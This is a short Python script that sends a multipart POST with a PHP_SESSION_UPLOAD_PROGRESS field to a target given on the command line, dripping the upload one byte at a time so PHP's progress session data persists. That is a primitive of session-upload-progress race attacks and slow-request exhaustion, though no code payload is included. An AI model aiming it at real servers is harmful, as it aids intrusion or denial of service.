import socket, sys, time
B="----b"; SID="a"*32
h=f"--{B}\r\n"
body=(h+'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'+SID+"\r\n"
      +h+'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n'+"x\r\n"
      +h+'Content-Disposition: form-data; name="f"; filename="a"\r\n\r\n'+"Z\r\n"
      +f"--{B}--\r\n").encode()
req=(b"POST /index.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary="+B.encode()
     +b"\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: close\r\n\r\n")+body
mark=b'filename="a"\r\n\r\n'; p=req.index(mark)+len(mark)
stage1=req[:p]+b"Z"; rest=req[p+1:]
s=socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=30)
s.sendall(stage1); time.sleep(1.6)
for b in rest:                      # one byte per FILE_DATA, paced
    s.sendall(bytes([b])); time.sleep(0.25)
s.settimeout(15)
out=b""
try:
    while True:
        d=s.recv(4096)
        if not d: break
        out+=d
except socket.timeout: pass
print("recv", len(out), out.split(b"\r\n")[0])
